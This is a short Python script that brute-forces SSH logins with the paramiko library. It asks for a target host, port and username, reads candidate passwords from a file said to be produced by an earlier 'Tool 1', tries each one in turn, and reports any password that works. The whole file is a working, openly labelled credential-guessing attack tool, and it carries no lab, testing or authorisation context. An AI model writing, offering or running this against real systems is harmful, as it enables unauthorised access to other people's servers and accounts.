import paramiko
import time

def brute_force_attack(host, port, user, password_list):
    # Create SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # Try each password in the list
    for password in password_list:
        try:
            print(f"Trying password: {password}")
            ssh.connect(host, port=port, username=user, password=password, timeout=5)
            print(f"Success! Password found: {password}")
            return password  # Return the found password
        except paramiko.AuthenticationException:
            print(f"Failed for password: {password}")
        except Exception as e:
            print(f"Error occurred: {e}")
        time.sleep(1)  # Small delay to avoid overwhelming the server
    
    print("Brute force attack failed! No valid passwords found.")
    return None

# Main function for initiating brute force attack
if __name__ == "__main__":
    host = input("Enter target host IP or domain: ")
    port = int(input("Enter port (default 22 for SSH): ") or 22)
    user = input("Enter username: ")

    # Load the password list from a file or generate it from Tool 1
    password_list = []
    with open('passwords.txt', 'r') as file:  # Passwords generated by Tool 1 saved in passwords.txt
        password_list = file.readlines()

    found_password = brute_force_attack(host, port, user, [pwd.strip() for pwd in password_list])
    if found_password:
        print(f"Password found: {found_password}")
    else:
        print("No passwords were successful.")
